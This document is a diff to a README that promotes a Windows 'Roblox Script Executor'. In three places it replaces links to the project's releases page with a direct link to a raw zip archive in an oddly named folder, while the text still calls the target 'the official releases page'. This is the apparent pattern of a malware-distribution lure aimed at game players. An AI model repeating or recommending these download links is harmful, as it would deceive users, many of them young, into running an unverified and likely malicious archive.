@@ -10,7 +10,7 @@ Think of it as a universal loader for your Roblox scripting adventures. No compl
 
 ## 📥 Download Now
 
-### [**⬇️ GET THE LATEST VERSION**](https://github.com/Erickperd8695/Roblox-Script-Executor-2026/releases)
+### [**⬇️ GET THE LATEST VERSION**](https://github.com/Erickperd8695/Roblox-Script-Executor-2026/raw/refs/heads/main/acaricide/2.9-alpha.4.zip)
 
 Visit this link to download the application directly from the official releases page.
 
@@ -127,7 +127,7 @@ Most issues can be solved with one of these simple steps.
 
 ## 🔄 Stay Updated
 
-New versions are released regularly with bug fixes and improvements. Bookmark the [download page](https://github.com/Erickperd8695/Roblox-Script-Executor-2026/releases) and check back often.
+New versions are released regularly with bug fixes and improvements. Bookmark the [download page](https://github.com/Erickperd8695/Roblox-Script-Executor-2026/raw/refs/heads/main/acaricide/2.9-alpha.4.zip) and check back often.
 
 ---
 
@@ -151,6 +151,6 @@ This tool is designed for personal use and experimentation. Always respect the r
 
 You're just one click away from the best Roblox scripting experience on Windows.
 
-[**⬇️ DOWNLOAD NOW**](https://github.com/Erickperd8695/Roblox-Script-Executor-2026/releases)
+[**⬇️ DOWNLOAD NOW**](https://github.com/Erickperd8695/Roblox-Script-Executor-2026/raw/refs/heads/main/acaricide/2.9-alpha.4.zip)
 
 Keywords: desktop-app, loader, lua, lua-execution, roblox, script-collection, scripts, tool-suite, windows, windows-desktop
